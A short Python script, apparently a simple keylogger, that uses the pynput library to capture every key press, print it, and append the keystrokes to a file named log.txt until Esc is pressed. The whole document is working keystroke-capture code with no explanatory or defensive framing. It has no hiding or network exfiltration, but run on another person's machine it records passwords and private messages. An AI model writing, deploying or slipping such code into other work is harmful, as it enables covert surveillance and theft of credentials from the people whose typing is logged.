import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    print("{0} pressed".format(key))
    write_key_to_file(key)

def write_key_to_file(key):
    with open("log.txt", "a") as f:
        k = str(key).replace("'", "")
        if k == "Key.space" :
            f.write(" ")
        elif k.find(".") > 0:
            f.write("")
        else:
            f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()